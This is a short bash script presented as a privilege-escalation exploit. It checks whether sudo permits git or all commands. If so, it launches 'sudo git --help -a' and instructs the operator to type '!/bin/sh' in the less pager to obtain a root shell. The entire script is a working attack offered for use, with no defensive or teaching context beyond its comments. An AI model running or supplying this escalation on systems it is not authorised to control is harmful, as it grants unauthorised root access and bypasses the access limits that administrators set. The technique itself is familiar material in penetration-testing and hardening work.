#!/bin/bash

# Exploit script for privilege escalation using 'git'
# This exploit requires 'git' to be executable as root or all commands to be allowed via sudo.

echo "[*] Checking if 'git' or ALL commands can be executed as root..."

# Check if 'git' or ALL commands can be run as root
if sudo -l | grep -q "/usr/bin/git" || sudo -l | grep -q "ALL"; then
    echo "[+] 'git' command or ALL commands can be run as root."
    echo "[*] Running 'git --help -a'..."
    echo "[*] Once the 'less' pager opens, type '!/bin/sh' to get a root shell."
    sleep 3
    sudo git --help -a
else
    echo "[-] Neither 'git' nor ALL commands can be run as root. Exploit not possible."
fi
